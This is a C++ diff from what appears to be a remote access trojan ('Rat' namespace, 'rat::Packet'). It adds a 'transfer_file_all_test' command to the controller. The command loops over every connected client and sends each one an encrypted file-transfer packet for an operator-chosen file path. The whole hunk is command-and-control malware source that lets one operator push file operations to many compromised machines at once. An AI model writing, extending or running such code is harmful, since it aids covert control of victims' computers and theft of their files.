@@ -480,6 +480,28 @@ namespace Rat
                                          {
                         if (ec) std::cout << "Send error: " << ec.message() << "\n"; });
                 }
+                else if(command == "transfer_file_all_test") 
+                {
+
+                    for(auto& client_send: clients_)
+                    {
+                        object_id = client_send.second;
+                        rat::Packet packet_transfer_file;
+                        packet_transfer_file.set_type(rat::Packet::TRANSFER_FILE);
+                        packet_transfer_file.set_packet_id("client_" + std::to_string(object_id) + "_" + Utils::getCurrentTimeString());
+                        packet_transfer_file.set_source_id("server_0");
+                        packet_transfer_file.set_destination_id("client_" + std::to_string(object_id));
+                        packet_transfer_file.set_encrypted(true);
+                        packet_transfer_file.set_file_path(argument);
+                        auto* chunked = packet_transfer_file.mutable_chunked_data();
+                        chunked->set_data_id("TRANSFER_FILE" + Utils::getCurrentTimeString() + std::to_string(object_id));
+                        chunked->set_sequence_number(0);
+                        chunked->set_total_chunks(1);
+                        chunked->set_payload(command);
+                        chunked->set_success(true);
+                        sendCommandToClient(client_send.first, packet_transfer_file);
+                    }
+                }
                 else if (command == "list_files_folders")
                 {
                     rat::Packet packet_list_files_folders;
